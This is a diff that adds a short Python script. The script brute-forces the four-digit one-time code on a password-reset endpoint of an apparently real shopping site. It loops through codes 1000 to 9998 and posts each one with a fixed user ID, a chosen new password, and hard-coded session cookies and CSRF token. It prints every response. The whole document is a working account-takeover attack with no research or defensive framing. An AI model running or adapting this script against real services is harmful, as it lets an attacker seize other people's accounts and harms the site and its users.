@@ -1,0 +1,18 @@
+import requests
+
+url = "https://ezee2kart.com/reset-pwd"
+
+headers = {"Cookie": "XSRF-TOKEN=eyJpdiI6IlBMSzJpXC9rN1NXTVYyaElXWmgxb1hRPT0iLCJ2YWx1ZSI6ImJOMndjTjdSWjkyM1RmMHFESjc0VWljNkJ2TjV6amxCNFNYQ2ZNZGZnRWxUS0lxSVpnMmJCK3dabGFKOTJzeDciLCJtYWMiOiIzYTBmOTA2ZGExODIzOTNlMzA1ODMzNDI3Nzg0NTAxNDliNjUxNzdiNDI4ZTAxZjhkMGYyNGI5NDhhOTE4ZjA2In0%3D; laravel_session=eyJpdiI6IjZnV253R0NndE1yQ2hqVmhzNHRqWlE9PSIsInZhbHVlIjoiYkp2Rmt1aTk5emNLUUNTRG1XQnUrdEd0d294S3VhMmpUd3lLT3pJTENRNndBQjZWQ01YU2NMbzB4N2VpUkwzUCIsIm1hYyI6IjUyMTFmNTRmNzAzNTBiMTMyZGIyZTBmN2FhMWJhOTg5ZGIzZGM4ZDIxNzJjZDBhZWEzNTJiYWM2ODAwOGI1YzgifQ%3D%3D",
+"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:92.0) Gecko/20100101 Firefox/92.0",
+"Content-Type": "application/x-www-form-urlencoded","Content-Length": "102"}
+for i in range (1000, 9999):
+    otp = i
+    data = {
+        "_token":"LirB5IM0fUEpIxSONwY3PYnX6ZA7TL5f8dib95MO",
+        "user_id":"104",
+        "otp":otp,
+        "newpassword":"Sibi",
+        "confirmpwd":"Sibi",
+    }
+    res = requests.post(url,headers=headers,data=data)
+    print(res.text, otp)
